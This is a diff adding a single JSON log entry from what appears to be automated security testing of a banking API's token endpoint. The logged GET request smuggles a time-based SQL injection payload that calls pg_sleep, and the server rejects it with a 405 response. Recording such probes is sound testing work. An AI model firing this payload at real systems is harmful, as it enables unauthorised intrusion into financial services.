@@ -1,0 +1,18 @@
+{
+  "url" : "https://vbank.open.bankingapi.ru/auth/bank-token?q=1%3B+DO+%24%24+BEGIN+PERFORM+pg_sleep%282%29%3B+END+%24%24%3B+--",
+  "method" : "GET",
+  "requestHeaders" : {
+    "Authorization" : "***"
+  },
+  "status" : 405,
+  "responseHeaders" : {
+    "allow" : "POST",
+    "content-length" : "31",
+    "content-security-policy" : "upgrade-insecure-requests",
+    "content-type" : "application/json",
+    "date" : "Wed, 29 Oct 2025 18:47:23 GMT",
+    "server" : "nginx/***",
+    "strict-transport-security" : "max-age=63072000; includeSubDomains; preload"
+  },
+  "responseBody" : "{\"detail\":\"Method Not Allowed\"}"
+}
